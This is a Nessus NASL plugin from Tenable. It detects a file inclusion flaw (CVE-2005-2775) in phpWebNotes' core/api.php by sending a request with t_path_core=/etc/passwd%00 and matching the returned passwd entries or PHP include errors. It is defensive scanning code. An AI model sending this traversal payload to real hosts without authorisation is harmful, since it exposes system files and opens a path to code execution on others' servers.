#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description) {
  script_id(19521);
  script_version("1.20");

  script_cve_id("CVE-2005-2775");
  script_bugtraq_id(14679);

  script_name(english:"phpWebNotes core/api.php t_path_core Parameter File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpWebNotes, an open source page annotation
system modeled after php.net. 

The version of phpWebNotes installed on the remote host allows
attackers to control the 't_path_core' parameter used when including
PHP code in the 'core/api.php' script.  By leveraging this flaw, an
attacker is able to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/409411/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/28");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpwebnotes:phpwebnotes");
script_end_attributes();

  script_summary(english:"Checks for t_path_core parameter file include vulnerability in phpWebNotes");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  #
  # nb: the actual value of t_path_core will be unaffected unless
  #     register_globals is disabled, according to 'core/php_api.php'.
  r = http_send_recv3(method:"GET",port:port,
    item:string(dir, "/core/api.php?", "t_path_core=/etc/passwd%00" ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but remote URLs
    #     might still work.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    "Failed opening required '/etc/passwd" >< res
  ) {
    security_hole(port);
    exit(0);
  }
  # Otherwise if the script exists, check the version number as
  # PHP's display_errors may simply be disabled.
  else if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    r = http_send_recv3(method:"GET",item:string(dir, "/login_page.php"), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # versions 2.0.0-pr1 and probably earlier are affected.
    if (egrep(string:res, pattern:'class="version">phpWebNotes - ([01]\\..+|2\\.0\\.0-pr1)</span>')) {
      w = "***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of phpWebNotes
***** installed there";
      security_hole(port:port, extra: w);
      exit(0);
    }
  }
}

